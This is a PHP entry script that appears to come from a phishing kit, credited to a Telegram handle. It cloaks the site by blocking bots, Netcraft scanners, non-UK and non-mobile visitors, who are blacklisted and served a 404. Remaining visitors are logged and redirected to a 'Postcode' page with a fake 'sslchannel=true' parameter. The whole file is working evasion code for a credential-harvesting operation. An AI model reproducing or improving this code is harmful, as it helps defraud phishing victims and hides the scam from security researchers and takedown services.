<?php
// @Kr3pto on telegram
error_reporting(0);
session_start();
require "configg.php";
require "evu_assetz/einc/functions.php";
if($internal_antibot == 1){
	require "evu_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("evu_assetz/einc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "evu_assetz/mobile_lock.php";
}
if($UK_lock == 1){
	if(onlyuk() == true){
	
	}else{
		$fp = fopen("evu_assetz/einc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("evu_assetz/einc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
$rand = generateRandomString(130);
require "evu_assetz/einc/visitor_log.php";
require "evu_assetz/einc/netcraft_check.php";
require "evu_assetz/einc/blacklist_lookup.php";
require "evu_assetz/einc/ip_range_check.php";
header("location:Postcode?sslchannel=true&sessionid=$rand");
?>